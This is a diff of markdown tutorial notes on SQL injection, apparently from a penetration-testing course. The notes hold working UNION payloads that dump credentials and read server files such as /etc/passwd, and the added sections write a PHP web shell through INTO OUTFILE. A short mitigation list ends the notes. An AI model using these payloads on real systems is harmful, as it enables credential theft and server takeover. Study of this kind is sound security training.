@@ -162,11 +162,11 @@ List of columns in a table
 
 `cn' UNION select 1, username, password, 4 from dev.credentials-- -`
 
-### Reading files
+## Reading files
 
 SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.
 
-#### Privileges
+### Privileges
 
 in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.
 
@@ -183,7 +183,7 @@ In the ` INFORMATION_SCHEMA` database, the `USER_PRIVILEGES` table contains info
 
 [Mysql Privilege reference](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html)
 
-##### DB user
+#### DB user
 
 If the user has DBA privileges, then it is much more probable that they will have file-read privileges. If the user does not, then we have to check our privileges to see what we can do.
 
@@ -199,7 +199,7 @@ SELECT user from mysql.user
 
 `cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`
 
-##### User privileges
+#### User privileges
 
 Test if we have super admin privileges with the following query:
 
@@ -209,7 +209,7 @@ Test if we have super admin privileges with the following query:
 
 `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" -- -`
 
-##### LOAD_FILE
+#### LOAD_FILE
 
 The `LOAD_FILE()`` function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
 
@@ -225,26 +225,26 @@ We know that the current page is search.php. The default Apache webroot is `/var
 
 `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/conn.php"), 3, 4-- -`
 
-### Writting files
+## Writting files
 
 When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.
 
-#### Write File Priveleges
+### Write File Priveleges
 
 To be able to write files to the back-end server using a MySQL database, we require three things:
 
-- User with FILE privilege enabled
-- MySQL global secure_file_priv variable not enabled
+- User with `FILE`` privilege enabled
+- MySQL global `secure_file_priv`` variable not enabled
 - Write access to the location we want to write to on the back-end server
 
-##### [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)
+#### [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)
 
 The `secure_file_priv`` variable is used to determine where to read/write files from.
 
 - An empty value lets us read files from the entire file system.
 - NULL means we cannot read/write from any directory.
 - MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege.
-- MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings.
+- MySQL uses `/var/lib/mysql-files` as the default folder. This means that reading files through a MySQL injection isn't possible with default settings.
 - Some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.
 
 `SHOW VARIABLES LIKE 'secure_file_priv';`
@@ -254,3 +254,31 @@ MySQL global variables are stored in a table called [global_variables](https://d
 `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
 
 `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
+
+#### [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)
+
+The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+    SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+
+#### Writing Files through SQL Injection
+
+Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
+
+    cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+##### Writing a web shell
+
+`<?php system($_REQUEST[0]); ?>`
+
+`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
+
+## Mitigating SQL Injection
+
+- Sanitizing any user input
+- Validating user input
+- We should ensure that the user querying the database only has minimum permissions.
+- parametrized queries
+- web application firewall, e.g. Cloudflare
